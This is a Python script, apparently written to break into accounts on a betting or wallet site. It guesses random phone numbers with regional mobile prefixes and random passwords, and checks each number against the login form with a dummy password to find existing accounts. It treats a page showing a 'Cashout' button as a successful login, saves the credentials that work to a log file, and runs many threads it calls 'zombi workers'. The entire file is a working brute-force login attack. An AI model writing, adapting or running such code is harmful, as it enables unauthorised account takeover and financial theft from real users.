import random
import requests
import json
import concurrent.futures
import os
import re

import socket

def gen_rand_num():
    debug_print("CALLED FUNCT: gen_rand_num()")
    while True:
        cache_num = []
        i = 0
        while i != 10:
            cache_num.append(random.choice(['0','1','2','3','4','5','6','7','8','9']))
            i += 1
        #make list become plain text(joined)
        num = ''.join(cache_num)
        
        possible_starts = ['70','80','81','90','91']
        for prefix in possible_starts:
            if num.startswith(prefix):
                return num
    

def validate(num,pswd):
    debug_print("CALLED FUNCT: validate(num,pswd)")
    try:
        login_url = "https://login/submit"
        data = {
            "username": num,
            "password": pswd
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',  # Replace with your User-Agent
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        response = requests.post(login_url, data=data, headers=headers)
        return response.text
    except Exception as e:
        debug_print(f"ERROR in 'validate(num,pswd)': {e}")
    
def assert_phone(text):
    debug_print("CALLED FUNCT: assert_phone(text)")
    if "enter a valid mobile number" in text:
        return False
    return True
    
def assert_login(text):
    debug_print("CALLED FUNCT: assert_login(text)")
    if '''<a class="m-cashout-btn" href="/ng/lite/cashout">Cashout</a>'''  in text:
        return True
    return False
    

def save_gotten():
    debug_print("CALLED FUNCT: save_gotten()")
    with open("vrute_logs.txt", "w") as file:
        json.dump(gotten_logins, file)
        print("vrute_logs updated ...")
    

def save_trials():
    debug_print("CALLED FUNCT: save_trials()")
    with open("vrute_trial_logs.txt", "w") as file:
        json.dump(trial_logins, file)
        debug_print("vrute_trial_logs updated ...")
        
    
def gotten_store(key,value):
    debug_print("CALLED FUNCT: gotten_store(key,value)")
    mold = {key: value}
    if mold not in gotten_logins:
        gotten_logins.append(mold)
        save_gotten()
    
def pick_rand_number():
    debug_print("CALLED FUNCT: pick_rand_number()")
    guess_num = gen_rand_num()
    request_html = validate(guess_num,"buffer_pswd")
    if assert_phone(request_html): #uses a single buff password to cross examine number.it first validates tgat tge phone number isnt already in either logins
        return guess_num

def gen_rand_pswd():
    debug_print("CALLED FUNCT: gen_rand_pswd()")
    chars = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'A', 'b', 'B', 'c', 'C', 'd', 'D', 'e', 'E', 'f', 'F', 'g', 'G', 'h', 'H', 'i', 'I', 'j', 'J', 'k', 'K', 'l', 'L', 'm', 'M', 'n', 'N', 'o', 'O', 'p', 'P', 'q', 'Q', 'r', 'R', 's', 'S', 't', 'T', 'u', 'U', 'v', 'V', 'w', 'W', 'x', 'X', 'y', 'Y', 'z', 'Z', '~', '!','@', '#','-', '_',]
    while True:
        length_pswd = random.randint(8,15)
        cache_pswd = []
        len_pswd_count = 0
        while len_pswd_count != length_pswd:
            cache_pswd.append(random.choice(chars))
            len_pswd_count += 1
        #make list become plain text(joined)
        result = ''.join(cache_pswd)
        if re.match(r'^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)', result):
            return result
        
            
def boot_gotten():
    debug_print("CALLED FUNCT: boot_gotten()")
    with open("vrute_logs.txt", "r") as file:
         return json.load(file)
         
def boot_trial():
    debug_print("CALLED FUNCT: boot_trial()")
    with open("vrute_trial_logs.txt", "r") as file:
         return json.load(file)
         
def unused(dicti):
    debug_print("CALLED FUNCT: unused(dicti)")
    try:
        if dicti in trial_logins:
            return False
        return True
    except Exception as e:
        debug_print(f"ERROR in 'unused()': {e}")
    
def init_zombi_workers():
    debug_print("CALLED FUNCT: init_zombi_workers()")
    num_threads = (os.cpu_count())*2
    debug_print(f"threads: {num_threads}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        #for i in range(num_threads):
        i = 1
        while i != num_threads :            
            executor.submit(worker,i)
            i += 1
           
        debug_print(f"submitted all workers ...")
            

def worker(i):
    
    debug_print("CALLED FUNCT: worker(i)")
    try:
        z = 0
        while True:
            z += 1
            debug_print(f"init worker {i}, instance {z} ...")
            rand_num = pick_rand_number() #from trial logins
            rand_pswd = gen_rand_pswd()
            blob = {rand_num:rand_pswd}
            print(blob)
            if unused(blob):
                if assert_login(validate(rand_num,rand_pswd)): #validate returns the response.text; assert_login checks the text to get hints if it loged in or not then returns a bool
                    gotten_store(rand_num,rand_pswd)
                else:
                    trial_logins.append(blob)
                    save_trials()
            debug_print(f'ended worker {i}, instance {z} ...')
    except Exception as e:
        debug_print(f"ERROR in 'worker()': {e}")

def is_internet_connected(host="8.8.8.8", port=53, timeout=3):
    debug_print("CALLED FUNCT: is_internet_connected(h,p,t)")
    try:
        socket.setdefaulttimeout(timeout)
        socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((host, port))
        return True
    except socket.error:
        return False
  
def get_logins():
    debug_print("CALLED FUNCT: get_logins()")
    try:
        gotten_logins = boot_gotten()
    except:
        gotten_logins = []    
    return gotten_logins

def try_logins():
    debug_print("CALLED FUNCT: try_logins()")
    try:
        trial_logins = boot_trial()
    except:
        trial_logins = []    
    return trial_logins

def debug_print(str):
    if debug:
        print(str)                                                      

#main  
debug = False                                                                                                          
toggle = input("enable debug? (y for YES or any other key for NO): ").lower()
if toggle == 'y':
    debug = True
 
gotten_logins = get_logins()
trial_logins = try_logins()
#print(len(trial_logins))
if is_internet_connected():
    init_zombi_workers()
else:
    debug_print("No internet connection detected ...")
             
          
    
    
    
    